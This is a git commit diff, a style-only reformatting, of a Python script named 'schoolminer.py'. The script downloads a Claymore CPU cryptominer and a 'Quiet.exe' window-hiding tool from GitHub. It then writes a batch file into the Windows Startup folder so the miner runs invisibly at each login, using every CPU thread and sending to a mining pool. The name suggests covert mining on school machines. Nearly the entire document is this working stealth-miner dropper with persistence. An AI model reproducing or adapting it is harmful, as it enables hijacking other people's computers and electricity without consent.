789408013092ca9383e4a65a01ad9054e558c5b9
SynneK1337 <276786@pw.edu.pl>
2018-11-30 23:55:26 +0100

    made script pep-8 compatible

--- schoolminer.py
+++ schoolminer.py
@@ -6,8 +6,10 @@ import sys
 print("[!] If possible, run this script as administrator for better hashrates.")
 print("[!] Only CryptoNight-based coins are supported currently. You can mine XMR, ETN etc.")
 
+
 class Miner():
     miner_url = 'https://github.com/nanopool/Claymore-XMR-CPU-Miner/releases/download/v4.0/Claymore.CryptoNote.CPU.Miner.v4.0.-.POOL.zip'
+
     def __init__(self):
         self.interface()
         self.download()
@@ -21,7 +23,7 @@ class Miner():
 
         self.pool = input("[?] Enter your pool address: ")
         if not self.pool:
-            self.pool = pool = "pool.etn.spacepools.org:1337"
+            self.pool = "pool.etn.spacepools.org:1337"
 
     def download(self):
         print('[+] Downloading the miner.')
@@ -35,15 +37,19 @@ class Miner():
 
     def configure(self):
         os.chdir('miner')
-        urllib.request.urlretrieve("https://github.com/MikserCompany/quiet/releases/download/v1.01/Quiet.exe", "Quiet.exe")
+        urllib.request.urlretrieve(
+            "https://github.com/MikserCompany/quiet/releases/download/v1.01/Quiet.exe", "Quiet.exe")
         print("[+] Quiet.exe downloaded")
         miner_location = os.getcwd().replace('\\', '/')
-        os.chdir(f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
+        os.chdir(
+            f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
         with open('start.bat', 'w') as cfg:
-            cfg.write(f'cd "{miner_location}" \nQuiet.exe NsCpuCNMiner64.exe -o {self.pool} -u {self.address} -t {os.getenv("NUMBER_OF_PROCESSORS")}')
+            cfg.write(
+                f'cd "{miner_location}" \nQuiet.exe NsCpuCNMiner64.exe -o {self.pool} -u {self.address} -t {os.getenv("NUMBER_OF_PROCESSORS")}')
             cfg.close()
         print("[+] Config generated.")
         os.system("start.bat")
         print("[+] Miner started.")
+
 
 Miner()
